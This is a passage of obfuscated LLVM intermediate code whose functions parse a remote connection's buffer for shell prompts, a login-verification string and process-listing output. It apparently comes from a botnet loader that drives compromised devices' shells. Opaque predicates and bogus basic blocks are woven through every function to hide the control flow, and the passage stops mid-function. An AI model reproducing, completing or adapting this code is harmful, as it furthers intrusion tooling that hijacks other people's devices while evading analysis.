; <label>:90:                                     ; preds = %81
  %91 = load %struct.connection*, %struct.connection** %11, align 8
  %92 = getelementptr inbounds %struct.connection, %struct.connection* %91, i32 0, i32 15
  %93 = load i32, i32* %13, align 4
  %94 = sext i32 %93 to i64
  %95 = getelementptr inbounds [8192 x i8], [8192 x i8]* %92, i64 0, i64 %94
  %96 = load i8, i8* %95, align 1
  %97 = zext i8 %96 to i32
  %98 = icmp eq i32 %97, 35
  br i1 %98, label %108, label %99

; <label>:99:                                     ; preds = %90
  %100 = load %struct.connection*, %struct.connection** %11, align 8
  %101 = getelementptr inbounds %struct.connection, %struct.connection* %100, i32 0, i32 15
  %102 = load i32, i32* %13, align 4
  %103 = sext i32 %102 to i64
  %104 = getelementptr inbounds [8192 x i8], [8192 x i8]* %101, i64 0, i64 %103
  %105 = load i8, i8* %104, align 1
  %106 = zext i8 %105 to i32
  %107 = icmp eq i32 %106, 37
  br i1 %107, label %108, label %110

; <label>:108:                                    ; preds = %99, %90, %81, %originalBBpart28, %originalBBpart24
  %109 = load i32, i32* %13, align 4
  store i32 %109, i32* %14, align 4
  br label %114

; <label>:110:                                    ; preds = %99
  br label %111

; <label>:111:                                    ; preds = %110
  %112 = load i32, i32* %13, align 4
  %113 = add nsw i32 %112, -1
  store i32 %113, i32* %13, align 4
  br label %28

; <label>:114:                                    ; preds = %108, %28
  %115 = load i32, i32* %14, align 4
  %116 = icmp eq i32 %115, -1
  br i1 %116, label %117, label %130

; <label>:117:                                    ; preds = %114
  %118 = load %struct.connection*, %struct.connection** %11, align 8
  %119 = getelementptr inbounds %struct.connection, %struct.connection* %118, i32 0, i32 15
  %120 = getelementptr inbounds [8192 x i8], [8192 x i8]* %119, i32 0, i32 0
  %121 = load %struct.connection*, %struct.connection** %11, align 8
  %122 = getelementptr inbounds %struct.connection, %struct.connection* %121, i32 0, i32 9
  %123 = load i16, i16* %122, align 8
  %124 = zext i16 %123 to i32
  %125 = call i32 @util_memsearch(i8* %120, i32 %124, i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.7, i32 0, i32 0), i32 7)
  store i32 %125, i32* %15, align 4
  %126 = icmp ne i32 %125, -1
  br i1 %126, label %127, label %129

; <label>:127:                                    ; preds = %117
  %128 = load i32, i32* %15, align 4
  store i32 %128, i32* %14, align 4
  br label %129

; <label>:129:                                    ; preds = %127, %117
  br label %130

; <label>:130:                                    ; preds = %129, %114
  %131 = load i32, i32* %14, align 4
  %132 = icmp eq i32 %131, -1
  br i1 %132, label %133, label %134

; <label>:133:                                    ; preds = %130
  store i32 0, i32* %10, align 4
  br label %136

; <label>:134:                                    ; preds = %130
  %135 = load i32, i32* %14, align 4
  store i32 %135, i32* %10, align 4
  br label %136

; <label>:136:                                    ; preds = %134, %133
  %137 = load i32, i32* %10, align 4
  ret i32 %137

originalBBalteredBB:                              ; preds = %originalBB, %1
  %138 = alloca i32, align 4
  %139 = alloca %struct.connection*, align 8
  %140 = alloca i8*, align 8
  %141 = alloca i32, align 4
  %142 = alloca i32, align 4
  %143 = alloca i32, align 4
  store %struct.connection* %0, %struct.connection** %139, align 8
  store i32 -1, i32* %142, align 4
  %144 = load %struct.connection*, %struct.connection** %139, align 8
  %145 = getelementptr inbounds %struct.connection, %struct.connection* %144, i32 0, i32 9
  %146 = load i16, i16* %145, align 8
  %147 = zext i16 %146 to i32
  store i32 %147, i32* %141, align 4
  br label %originalBB

originalBB1alteredBB:                             ; preds = %originalBB1, %31
  %148 = load %struct.connection*, %struct.connection** %11, align 8
  %149 = getelementptr inbounds %struct.connection, %struct.connection* %148, i32 0, i32 15
  %150 = load i32, i32* %13, align 4
  %151 = sext i32 %150 to i64
  %152 = getelementptr inbounds [8192 x i8], [8192 x i8]* %149, i64 0, i64 %151
  %153 = load i8, i8* %152, align 1
  %154 = zext i8 %153 to i32
  %155 = icmp eq i32 %154, 58
  br label %originalBB1

originalBB6alteredBB:                             ; preds = %originalBB6, %56
  %156 = load %struct.connection*, %struct.connection** %11, align 8
  %157 = getelementptr inbounds %struct.connection, %struct.connection* %156, i32 0, i32 15
  %158 = load i32, i32* %13, align 4
  %159 = sext i32 %158 to i64
  %160 = getelementptr inbounds [8192 x i8], [8192 x i8]* %157, i64 0, i64 %159
  %161 = load i8, i8* %160, align 1
  %162 = zext i8 %161 to i32
  %163 = icmp eq i32 %162, 62
  br label %originalBB6
}

; Function Attrs: noinline nounwind uwtable
define i32 @connection_consume_prompt(%struct.connection*) #0 {
  %2 = alloca i32, align 4
  %3 = alloca %struct.connection*, align 8
  %4 = alloca i8*, align 8
  %5 = alloca i32, align 4
  %6 = alloca i32, align 4
  store %struct.connection* %0, %struct.connection** %3, align 8
  store i32 -1, i32* %6, align 4
  %7 = load %struct.connection*, %struct.connection** %3, align 8
  %8 = getelementptr inbounds %struct.connection, %struct.connection* %7, i32 0, i32 9
  %9 = load i16, i16* %8, align 8
  %10 = zext i16 %9 to i32
  store i32 %10, i32* %5, align 4
  br label %11

; <label>:11:                                     ; preds = %originalBBpart222, %1
  %12 = load i32, i32* %5, align 4
  %13 = icmp sge i32 %12, 0
  br i1 %13, label %14, label %145

; <label>:14:                                     ; preds = %11
  %15 = load i32, i32* @x.11
  %16 = load i32, i32* @y.12
  %17 = sub i32 %15, 1
  %18 = mul i32 %15, %17
  %19 = urem i32 %18, 2
  %20 = icmp eq i32 %19, 0
  %21 = icmp slt i32 %16, 10
  %22 = or i1 %20, %21
  br i1 %22, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %14
  %23 = load %struct.connection*, %struct.connection** %3, align 8
  %24 = getelementptr inbounds %struct.connection, %struct.connection* %23, i32 0, i32 15
  %25 = load i32, i32* %5, align 4
  %26 = sext i32 %25 to i64
  %27 = getelementptr inbounds [8192 x i8], [8192 x i8]* %24, i64 0, i64 %26
  %28 = load i8, i8* %27, align 1
  %29 = zext i8 %28 to i32
  %30 = icmp eq i32 %29, 58
  %31 = load i32, i32* @x.11
  %32 = load i32, i32* @y.12
  %33 = sub i32 %31, 1
  %34 = mul i32 %31, %33
  %35 = urem i32 %34, 2
  %36 = icmp eq i32 %35, 0
  %37 = icmp slt i32 %32, 10
  %38 = or i1 %36, %37
  br i1 %38, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br i1 %30, label %107, label %39

; <label>:39:                                     ; preds = %originalBBpart2
  %40 = load %struct.connection*, %struct.connection** %3, align 8
  %41 = getelementptr inbounds %struct.connection, %struct.connection* %40, i32 0, i32 15
  %42 = load i32, i32* %5, align 4
  %43 = sext i32 %42 to i64
  %44 = getelementptr inbounds [8192 x i8], [8192 x i8]* %41, i64 0, i64 %43
  %45 = load i8, i8* %44, align 1
  %46 = zext i8 %45 to i32
  %47 = icmp eq i32 %46, 62
  br i1 %47, label %107, label %48

; <label>:48:                                     ; preds = %39
  %49 = load i32, i32* @x.11
  %50 = load i32, i32* @y.12
  %51 = sub i32 %49, 1
  %52 = mul i32 %49, %51
  %53 = urem i32 %52, 2
  %54 = icmp eq i32 %53, 0
  %55 = icmp slt i32 %50, 10
  %56 = or i1 %54, %55
  br i1 %56, label %originalBB1, label %originalBB1alteredBB

originalBB1:                                      ; preds = %originalBB1alteredBB, %48
  %57 = load %struct.connection*, %struct.connection** %3, align 8
  %58 = getelementptr inbounds %struct.connection, %struct.connection* %57, i32 0, i32 15
  %59 = load i32, i32* %5, align 4
  %60 = sext i32 %59 to i64
  %61 = getelementptr inbounds [8192 x i8], [8192 x i8]* %58, i64 0, i64 %60
  %62 = load i8, i8* %61, align 1
  %63 = zext i8 %62 to i32
  %64 = icmp eq i32 %63, 36
  %65 = load i32, i32* @x.11
  %66 = load i32, i32* @y.12
  %67 = sub i32 %65, 1
  %68 = mul i32 %65, %67
  %69 = urem i32 %68, 2
  %70 = icmp eq i32 %69, 0
  %71 = icmp slt i32 %66, 10
  %72 = or i1 %70, %71
  br i1 %72, label %originalBBpart24, label %originalBB1alteredBB

originalBBpart24:                                 ; preds = %originalBB1
  br i1 %64, label %107, label %73

; <label>:73:                                     ; preds = %originalBBpart24
  %74 = load i32, i32* @x.11
  %75 = load i32, i32* @y.12
  %76 = sub i32 %74, 1
  %77 = mul i32 %74, %76
  %78 = urem i32 %77, 2
  %79 = icmp eq i32 %78, 0
  %80 = icmp slt i32 %75, 10
  %81 = or i1 %79, %80
  br i1 %81, label %originalBB6, label %originalBB6alteredBB

originalBB6:                                      ; preds = %originalBB6alteredBB, %73
  %82 = load %struct.connection*, %struct.connection** %3, align 8
  %83 = getelementptr inbounds %struct.connection, %struct.connection* %82, i32 0, i32 15
  %84 = load i32, i32* %5, align 4
  %85 = sext i32 %84 to i64
  %86 = getelementptr inbounds [8192 x i8], [8192 x i8]* %83, i64 0, i64 %85
  %87 = load i8, i8* %86, align 1
  %88 = zext i8 %87 to i32
  %89 = icmp eq i32 %88, 35
  %90 = load i32, i32* @x.11
  %91 = load i32, i32* @y.12
  %92 = sub i32 %90, 1
  %93 = mul i32 %90, %92
  %94 = urem i32 %93, 2
  %95 = icmp eq i32 %94, 0
  %96 = icmp slt i32 %91, 10
  %97 = or i1 %95, %96
  br i1 %97, label %originalBBpart28, label %originalBB6alteredBB

originalBBpart28:                                 ; preds = %originalBB6
  br i1 %89, label %107, label %98

; <label>:98:                                     ; preds = %originalBBpart28
  %99 = load %struct.connection*, %struct.connection** %3, align 8
  %100 = getelementptr inbounds %struct.connection, %struct.connection* %99, i32 0, i32 15
  %101 = load i32, i32* %5, align 4
  %102 = sext i32 %101 to i64
  %103 = getelementptr inbounds [8192 x i8], [8192 x i8]* %100, i64 0, i64 %102
  %104 = load i8, i8* %103, align 1
  %105 = zext i8 %104 to i32
  %106 = icmp eq i32 %105, 37
  br i1 %106, label %107, label %109

; <label>:107:                                    ; preds = %98, %originalBBpart28, %originalBBpart24, %39, %originalBBpart2
  %108 = load i32, i32* %5, align 4
  store i32 %108, i32* %6, align 4
  br label %145

; <label>:109:                                    ; preds = %98
  %110 = load i32, i32* @x.11
  %111 = load i32, i32* @y.12
  %112 = sub i32 %110, 1
  %113 = mul i32 %110, %112
  %114 = urem i32 %113, 2
  %115 = icmp eq i32 %114, 0
  %116 = icmp slt i32 %111, 10
  %117 = or i1 %115, %116
  br i1 %117, label %originalBB10, label %originalBB10alteredBB

originalBB10:                                     ; preds = %originalBB10alteredBB, %109
  %118 = load i32, i32* @x.11
  %119 = load i32, i32* @y.12
  %120 = sub i32 %118, 1
  %121 = mul i32 %118, %120
  %122 = urem i32 %121, 2
  %123 = icmp eq i32 %122, 0
  %124 = icmp slt i32 %119, 10
  %125 = or i1 %123, %124
  br i1 %125, label %originalBBpart212, label %originalBB10alteredBB

originalBBpart212:                                ; preds = %originalBB10
  br label %126

; <label>:126:                                    ; preds = %originalBBpart212
  %127 = load i32, i32* @x.11
  %128 = load i32, i32* @y.12
  %129 = sub i32 %127, 1
  %130 = mul i32 %127, %129
  %131 = urem i32 %130, 2
  %132 = icmp eq i32 %131, 0
  %133 = icmp slt i32 %128, 10
  %134 = or i1 %132, %133
  br i1 %134, label %originalBB14, label %originalBB14alteredBB

originalBB14:                                     ; preds = %originalBB14alteredBB, %126
  %135 = load i32, i32* %5, align 4
  %136 = add nsw i32 %135, -1
  store i32 %136, i32* %5, align 4
  %137 = load i32, i32* @x.11
  %138 = load i32, i32* @y.12
  %139 = sub i32 %137, 1
  %140 = mul i32 %137, %139
  %141 = urem i32 %140, 2
  %142 = icmp eq i32 %141, 0
  %143 = icmp slt i32 %138, 10
  %144 = or i1 %142, %143
  br i1 %144, label %originalBBpart222, label %originalBB14alteredBB

originalBBpart222:                                ; preds = %originalBB14
  br label %11

; <label>:145:                                    ; preds = %107, %11
  %146 = load i32, i32* @x.11
  %147 = load i32, i32* @y.12
  %148 = sub i32 %146, 1
  %149 = mul i32 %146, %148
  %150 = urem i32 %149, 2
  %151 = icmp eq i32 %150, 0
  %152 = icmp slt i32 %147, 10
  %153 = or i1 %151, %152
  br i1 %153, label %originalBB24, label %originalBB24alteredBB

originalBB24:                                     ; preds = %originalBB24alteredBB, %145
  %154 = load i32, i32* %6, align 4
  %155 = icmp eq i32 %154, -1
  %156 = load i32, i32* @x.11
  %157 = load i32, i32* @y.12
  %158 = sub i32 %156, 1
  %159 = mul i32 %156, %158
  %160 = urem i32 %159, 2
  %161 = icmp eq i32 %160, 0
  %162 = icmp slt i32 %157, 10
  %163 = or i1 %161, %162
  br i1 %163, label %originalBBpart227, label %originalBB24alteredBB

originalBBpart227:                                ; preds = %originalBB24
  br i1 %155, label %164, label %165

; <label>:164:                                    ; preds = %originalBBpart227
  store i32 0, i32* %2, align 4
  br label %183

; <label>:165:                                    ; preds = %originalBBpart227
  %166 = load i32, i32* @x.11
  %167 = load i32, i32* @y.12
  %168 = sub i32 %166, 1
  %169 = mul i32 %166, %168
  %170 = urem i32 %169, 2
  %171 = icmp eq i32 %170, 0
  %172 = icmp slt i32 %167, 10
  %173 = or i1 %171, %172
  br i1 %173, label %originalBB29, label %originalBB29alteredBB

originalBB29:                                     ; preds = %originalBB29alteredBB, %165
  %174 = load i32, i32* %6, align 4
  store i32 %174, i32* %2, align 4
  %175 = load i32, i32* @x.11
  %176 = load i32, i32* @y.12
  %177 = sub i32 %175, 1
  %178 = mul i32 %175, %177
  %179 = urem i32 %178, 2
  %180 = icmp eq i32 %179, 0
  %181 = icmp slt i32 %176, 10
  %182 = or i1 %180, %181
  br i1 %182, label %originalBBpart231, label %originalBB29alteredBB

originalBBpart231:                                ; preds = %originalBB29
  br label %183

; <label>:183:                                    ; preds = %originalBBpart231, %164
  %184 = load i32, i32* %2, align 4
  ret i32 %184

originalBBalteredBB:                              ; preds = %originalBB, %14
  %185 = load %struct.connection*, %struct.connection** %3, align 8
  %186 = getelementptr inbounds %struct.connection, %struct.connection* %185, i32 0, i32 15
  %187 = load i32, i32* %5, align 4
  %188 = sext i32 %187 to i64
  %189 = getelementptr inbounds [8192 x i8], [8192 x i8]* %186, i64 0, i64 %188
  %190 = load i8, i8* %189, align 1
  %191 = zext i8 %190 to i32
  %192 = icmp eq i32 %191, 58
  br label %originalBB

originalBB1alteredBB:                             ; preds = %originalBB1, %48
  %193 = load %struct.connection*, %struct.connection** %3, align 8
  %194 = getelementptr inbounds %struct.connection, %struct.connection* %193, i32 0, i32 15
  %195 = load i32, i32* %5, align 4
  %196 = sext i32 %195 to i64
  %197 = getelementptr inbounds [8192 x i8], [8192 x i8]* %194, i64 0, i64 %196
  %198 = load i8, i8* %197, align 1
  %199 = zext i8 %198 to i32
  %200 = icmp eq i32 %199, 36
  br label %originalBB1

originalBB6alteredBB:                             ; preds = %originalBB6, %73
  %201 = load %struct.connection*, %struct.connection** %3, align 8
  %202 = getelementptr inbounds %struct.connection, %struct.connection* %201, i32 0, i32 15
  %203 = load i32, i32* %5, align 4
  %204 = sext i32 %203 to i64
  %205 = getelementptr inbounds [8192 x i8], [8192 x i8]* %202, i64 0, i64 %204
  %206 = load i8, i8* %205, align 1
  %207 = zext i8 %206 to i32
  %208 = icmp eq i32 %207, 35
  br label %originalBB6

originalBB10alteredBB:                            ; preds = %originalBB10, %109
  br label %originalBB10

originalBB14alteredBB:                            ; preds = %originalBB14, %126
  %209 = load i32, i32* %5, align 4
  %_ = shl i32 %209, -1
  %_15 = sub i32 0, %209
  %gen = add i32 %_15, -1
  %_16 = sub i32 0, %209
  %gen17 = add i32 %_16, -1
  %_18 = shl i32 %209, -1
  %_19 = shl i32 %209, -1
  %_20 = shl i32 %209, -1
  %210 = add nsw i32 %209, -1
  store i32 %210, i32* %5, align 4
  br label %originalBB14

originalBB24alteredBB:                            ; preds = %originalBB24, %145
  %211 = load i32, i32* %6, align 4
  %212 = icmp eq i32 %211, -1
  br label %originalBB24

originalBB29alteredBB:                            ; preds = %originalBB29, %165
  %213 = load i32, i32* %6, align 4
  store i32 %213, i32* %2, align 4
  br label %originalBB29
}

; Function Attrs: noinline nounwind uwtable
define i32 @connection_consume_verify_login(%struct.connection*) #0 {
  %2 = alloca i32, align 4
  %3 = alloca %struct.connection*, align 8
  %4 = alloca i32, align 4
  store %struct.connection* %0, %struct.connection** %3, align 8
  %5 = load %struct.connection*, %struct.connection** %3, align 8
  %6 = getelementptr inbounds %struct.connection, %struct.connection* %5, i32 0, i32 15
  %7 = getelementptr inbounds [8192 x i8], [8192 x i8]* %6, i32 0, i32 0
  %8 = load %struct.connection*, %struct.connection** %3, align 8
  %9 = getelementptr inbounds %struct.connection, %struct.connection* %8, i32 0, i32 9
  %10 = load i16, i16* %9, align 8
  %11 = zext i16 %10 to i32
  %12 = call i32 @util_memsearch(i8* %7, i32 %11, i8* getelementptr inbounds ([24 x i8], [24 x i8]* @.str.8, i32 0, i32 0), i32 23)
  store i32 %12, i32* %4, align 4
  %13 = load i32, i32* %4, align 4
  %14 = icmp eq i32 %13, -1
  br i1 %14, label %15, label %16

; <label>:15:                                     ; preds = %1
  store i32 0, i32* %2, align 4
  br label %18

; <label>:16:                                     ; preds = %1
  %17 = load i32, i32* %4, align 4
  store i32 %17, i32* %2, align 4
  br label %18

; <label>:18:                                     ; preds = %16, %15
  %19 = load i32, i32* @x.13
  %20 = load i32, i32* @y.14
  %21 = sub i32 %19, 1
  %22 = mul i32 %19, %21
  %23 = urem i32 %22, 2
  %24 = icmp eq i32 %23, 0
  %25 = icmp slt i32 %20, 10
  %26 = or i1 %24, %25
  br i1 %26, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %18
  %27 = load i32, i32* %2, align 4
  %28 = load i32, i32* @x.13
  %29 = load i32, i32* @y.14
  %30 = sub i32 %28, 1
  %31 = mul i32 %28, %30
  %32 = urem i32 %31, 2
  %33 = icmp eq i32 %32, 0
  %34 = icmp slt i32 %29, 10
  %35 = or i1 %33, %34
  br i1 %35, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  ret i32 %27

originalBBalteredBB:                              ; preds = %originalBB, %18
  %36 = load i32, i32* %2, align 4
  br label %originalBB
}

; Function Attrs: noinline nounwind uwtable
define i32 @connection_consume_psoutput(%struct.connection*) #0 {
  %2 = alloca i32, align 4
  %3 = alloca %struct.connection*, align 8
  %4 = alloca i32, align 4
  %5 = alloca i8*, align 8
  %6 = alloca i32, align 4
  %7 = alloca i32, align 4
  %8 = alloca i8, align 1
  %9 = alloca i8, align 1
  %10 = alloca i8*, align 8
  %11 = alloca i8*, align 8
  %12 = alloca i32, align 4
  %13 = alloca i32, align 4
  %14 = alloca i32, align 4
  %15 = alloca i32, align 4
  store %struct.connection* %0, %struct.connection** %3, align 8
  %16 = load %struct.connection*, %struct.connection** %3, align 8
  %17 = getelementptr inbounds %struct.connection, %struct.connection* %16, i32 0, i32 15
  %18 = getelementptr inbounds [8192 x i8], [8192 x i8]* %17, i32 0, i32 0
  store i8* %18, i8** %5, align 8
  %19 = load %struct.connection*, %struct.connection** %3, align 8
  %20 = getelementptr inbounds %struct.connection, %struct.connection* %19, i32 0, i32 15
  %21 = getelementptr inbounds [8192 x i8], [8192 x i8]* %20, i32 0, i32 0
  %22 = load %struct.connection*, %struct.connection** %3, align 8
  %23 = getelementptr inbounds %struct.connection, %struct.connection* %22, i32 0, i32 9
  %24 = load i16, i16* %23, align 8
  %25 = zext i16 %24 to i32
  %26 = call i32 @util_memsearch(i8* %21, i32 %25, i8* getelementptr inbounds ([24 x i8], [24 x i8]* @.str.8, i32 0, i32 0), i32 23)
  store i32 %26, i32* %4, align 4
  store i32 0, i32* %6, align 4
  br label %27

; <label>:27:                                     ; preds = %originalBBpart278, %1
  %28 = load i32, i32* %6, align 4
  %29 = load i32, i32* %4, align 4
  %30 = icmp eq i32 %29, -1
  br i1 %30, label %31, label %36

; <label>:31:                                     ; preds = %27
  %32 = load %struct.connection*, %struct.connection** %3, align 8
  %33 = getelementptr inbounds %struct.connection, %struct.connection* %32, i32 0, i32 9
  %34 = load i16, i16* %33, align 8
  %35 = zext i16 %34 to i32
  br label %38

; <label>:36:                                     ; preds = %27
  %37 = load i32, i32* %4, align 4
  br label %38

; <label>:38:                                     ; preds = %36, %31
  %39 = phi i32 [ %35, %31 ], [ %37, %36 ]
  %40 = icmp slt i32 %28, %39
  br i1 %40, label %41, label %552

; <label>:41:                                     ; preds = %38
  %42 = load %struct.connection*, %struct.connection** %3, align 8
  %43 = getelementptr inbounds %struct.connection, %struct.connection* %42, i32 0, i32 15
  %44 = load i32, i32* %6, align 4
  %45 = sext i32 %44 to i64
  %46 = getelementptr inbounds [8192 x i8], [8192 x i8]* %43, i64 0, i64 %45
  %47 = load i8, i8* %46, align 1
  %48 = zext i8 %47 to i32
  %49 = icmp eq i32 %48, 13
  br i1 %49, label %50, label %72

; <label>:50:                                     ; preds = %41
  %51 = load i32, i32* @x.15
  %52 = load i32, i32* @y.16
  %53 = sub i32 %51, 1
  %54 = mul i32 %51, %53
  %55 = urem i32 %54, 2
  %56 = icmp eq i32 %55, 0
  %57 = icmp slt i32 %52, 10
  %58 = or i1 %56, %57
  br i1 %58, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %50
  %59 = load %struct.connection*, %struct.connection** %3, align 8
  %60 = getelementptr inbounds %struct.connection, %struct.connection* %59, i32 0, i32 15
  %61 = load i32, i32* %6, align 4
  %62 = sext i32 %61 to i64
  %63 = getelementptr inbounds [8192 x i8], [8192 x i8]* %60, i64 0, i64 %62
  store i8 0, i8* %63, align 1
  %64 = load i32, i32* @x.15
  %65 = load i32, i32* @y.16
  %66 = sub i32 %64, 1
  %67 = mul i32 %64, %66
  %68 = urem i32 %67, 2
  %69 = icmp eq i32 %68, 0
  %70 = icmp slt i32 %65, 10
  %71 = or i1 %69, %70
  br i1 %71, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br label %516

; <label>:72:                                     ; preds = %41
  %73 = load i32, i32* @x.15
  %74 = load i32, i32* @y.16
  %75 = sub i32 %73, 1
  %76 = mul i32 %73, %75
  %77 = urem i32 %76, 2
  %78 = icmp eq i32 %77, 0
  %79 = icmp slt i32 %74, 10
  %80 = or i1 %78, %79
  br i1 %80, label %originalBB1, label %originalBB1alteredBB

originalBB1:                                      ; preds = %originalBB1alteredBB, %72
  %81 = load %struct.connection*, %struct.connection** %3, align 8
  %82 = getelementptr inbounds %struct.connection, %struct.connection* %81, i32 0, i32 15
  %83 = load i32, i32* %6, align 4
  %84 = sext i32 %83 to i64
  %85 = getelementptr inbounds [8192 x i8], [8192 x i8]* %82, i64 0, i64 %84
  %86 = load i8, i8* %85, align 1
  %87 = zext i8 %86 to i32
  %88 = icmp eq i32 %87, 10
  %89 = load i32, i32* @x.15
  %90 = load i32, i32* @y.16
  %91 = sub i32 %89, 1
  %92 = mul i32 %89, %91
  %93 = urem i32 %92, 2
  %94 = icmp eq i32 %93, 0
  %95 = icmp slt i32 %90, 10
  %96 = or i1 %94, %95
  br i1 %96, label %originalBBpart24, label %originalBB1alteredBB

originalBBpart24:                                 ; preds = %originalBB1
  br i1 %88, label %97, label %515

; <label>:97:                                     ; preds = %originalBBpart24
  store i8 0, i8* %8, align 1
  store i8 0, i8* %9, align 1
  store i8* null, i8** %10, align 8
  store i8* null, i8** %11, align 8
  %98 = load %struct.connection*, %struct.connection** %3, align 8
  %99 = getelementptr inbounds %struct.connection, %struct.connection* %98, i32 0, i32 15
  %100 = load i32, i32* %6, align 4
  %101 = sext i32 %100 to i64
  %102 = getelementptr inbounds [8192 x i8], [8192 x i8]* %99, i64 0, i64 %101
  store i8 0, i8* %102, align 1
  store i32 0, i32* %7, align 4
  br label %103

; <label>:103:                                    ; preds = %282, %97
  %104 = load i32, i32* %7, align 4
  %105 = sext i32 %104 to i64
  %106 = load %struct.connection*, %struct.connection** %3, align 8
  %107 = getelementptr inbounds %struct.connection, %struct.connection* %106, i32 0, i32 15
  %108 = load i32, i32* %6, align 4
  %109 = sext i32 %108 to i64
  %110 = getelementptr inbounds [8192 x i8], [8192 x i8]* %107, i64 0, i64 %109
  %111 = load i8*, i8** %5, align 8
  %112 = ptrtoint i8* %110 to i64
  %113 = ptrtoint i8* %111 to i64
  %114 = sub i64 %112, %113
  %115 = icmp slt i64 %105, %114
  br i1 %115, label %116, label %285

; <label>:116:                                    ; preds = %103
  %117 = load i8*, i8** %5, align 8
  %118 = load i32, i32* %7, align 4
  %119 = sext i32 %118 to i64
  %120 = getelementptr inbounds i8, i8* %117, i64 %119
  %121 = load i8, i8* %120, align 1
  %122 = sext i8 %121 to i32
  %123 = icmp eq i32 %122, 32
  br i1 %123, label %156, label %124

; <label>:124:                                    ; preds = %116
  %125 = load i32, i32* @x.15
  %126 = load i32, i32* @y.16
  %127 = sub i32 %125, 1
  %128 = mul i32 %125, %127
  %129 = urem i32 %128, 2
  %130 = icmp eq i32 %129, 0
  %131 = icmp slt i32 %126, 10
  %132 = or i1 %130, %131
  br i1 %132, label %originalBB6, label %originalBB6alteredBB

originalBB6:                                      ; preds = %originalBB6alteredBB, %124
  %133 = load i8*, i8** %5, align 8
  %134 = load i32, i32* %7, align 4
  %135 = sext i32 %134 to i64
  %136 = getelementptr inbounds i8, i8* %133, i64 %135
  %137 = load i8, i8* %136, align 1
  %138 = sext i8 %137 to i32
  %139 = icmp eq i32 %138, 9
  %140 = load i32, i32* @x.15
  %141 = load i32, i32* @y.16
  %142 = sub i32 %140, 1
  %143 = mul i32 %140, %142
  %144 = urem i32 %143, 2
  %145 = icmp eq i32 %144, 0
  %146 = icmp slt i32 %141, 10
  %147 = or i1 %145, %146
  br i1 %147, label %originalBBpart28, label %originalBB6alteredBB

originalBBpart28:                                 ; preds = %originalBB6
  br i1 %139, label %156, label %148

; <label>:148:                                    ; preds = %originalBBpart28
  %149 = load i8*, i8** %5, align 8
  %150 = load i32, i32* %7, align 4
  %151 = sext i32 %150 to i64
  %152 = getelementptr inbounds i8, i8* %149, i64 %151
  %153 = load i8, i8* %152, align 1
  %154 = sext i8 %153 to i32
  %155 = icmp eq i32 %154, 0
  br i1 %155, label %156, label %187

; <label>:156:                                    ; preds = %148, %originalBBpart28, %116
  %157 = load i8, i8* %8, align 1
  %158 = zext i8 %157 to i32
  %159 = icmp sgt i32 %158, 0
  br i1 %159, label %160, label %182

; <label>:160:                                    ; preds = %156
  %161 = load i8, i8* %9, align 1
  %162 = icmp ne i8 %161, 0
  br i1 %162, label %182, label %163

; <label>:163:                                    ; preds = %160
  %164 = load i32, i32* @x.15
  %165 = load i32, i32* @y.16
  %166 = sub i32 %164, 1
  %167 = mul i32 %164, %166
  %168 = urem i32 %167, 2
  %169 = icmp eq i32 %168, 0
  %170 = icmp slt i32 %165, 10
  %171 = or i1 %169, %170
  br i1 %171, label %originalBB10, label %originalBB10alteredBB

originalBB10:                                     ; preds = %originalBB10alteredBB, %163
  %172 = load i8, i8* %8, align 1
  %173 = add i8 %172, 1
  store i8 %173, i8* %8, align 1
  %174 = load i32, i32* @x.15
  %175 = load i32, i32* @y.16
  %176 = sub i32 %174, 1
  %177 = mul i32 %174, %176
  %178 = urem i32 %177, 2
  %179 = icmp eq i32 %178, 0
  %180 = icmp slt i32 %175, 10
  %181 = or i1 %179, %180
  br i1 %181, label %originalBBpart219, label %originalBB10alteredBB

originalBBpart219:                                ; preds = %originalBB10
  br label %182

; <label>:182:                                    ; preds = %originalBBpart219, %160, %156
  %183 = load i8*, i8** %5, align 8
  %184 = load i32, i32* %7, align 4
  %185 = sext i32 %184 to i64
  %186 = getelementptr inbounds i8, i8* %183, i64 %185
  store i8 0, i8* %186, align 1
  store i8 1, i8* %9, align 1
  br label %281

; <label>:187:                                    ; preds = %148
  %188 = load i8, i8* %8, align 1
  %189 = zext i8 %188 to i32
  %190 = icmp eq i32 %189, 0
  br i1 %190, label %191, label %198

; <label>:191:                                    ; preds = %187
  %192 = load i8*, i8** %5, align 8
  %193 = load i32, i32* %7, align 4
  %194 = sext i32 %193 to i64
  %195 = getelementptr inbounds i8, i8* %192, i64 %194
  store i8* %195, i8** %10, align 8
  %196 = load i8, i8* %8, align 1
  %197 = add i8 %196, 1
  store i8 %197, i8* %8, align 1
  br label %264

; <label>:198:                                    ; preds = %187
  %199 = load i32, i32* @x.15
  %200 = load i32, i32* @y.16
  %201 = sub i32 %199, 1
  %202 = mul i32 %199, %201
  %203 = urem i32 %202, 2
  %204 = icmp eq i32 %203, 0
  %205 = icmp slt i32 %200, 10
  %206 = or i1 %204, %205
  br i1 %206, label %originalBB21, label %originalBB21alteredBB

originalBB21:                                     ; preds = %originalBB21alteredBB, %198
  %207 = load i8, i8* %8, align 1
  %208 = zext i8 %207 to i32
  %209 = icmp sge i32 %208, 3
  %210 = load i32, i32* @x.15
  %211 = load i32, i32* @y.16
  %212 = sub i32 %210, 1
  %213 = mul i32 %210, %212
  %214 = urem i32 %213, 2
  %215 = icmp eq i32 %214, 0
  %216 = icmp slt i32 %211, 10
  %217 = or i1 %215, %216
  br i1 %217, label %originalBBpart223, label %originalBB21alteredBB

originalBBpart223:                                ; preds = %originalBB21
  br i1 %209, label %218, label %263

; <label>:218:                                    ; preds = %originalBBpart223
  %219 = load i32, i32* @x.15
  %220 = load i32, i32* @y.16
  %221 = sub i32 %219, 1
  %222 = mul i32 %219, %221
  %223 = urem i32 %222, 2
  %224 = icmp eq i32 %223, 0
  %225 = icmp slt i32 %220, 10
  %226 = or i1 %224, %225
  br i1 %226, label %originalBB25, label %originalBB25alteredBB

originalBB25:                                     ; preds = %originalBB25alteredBB, %218
  %227 = load i8, i8* %8, align 1
  %228 = zext i8 %227 to i32
  %229 = icmp sle i32 %228, 5
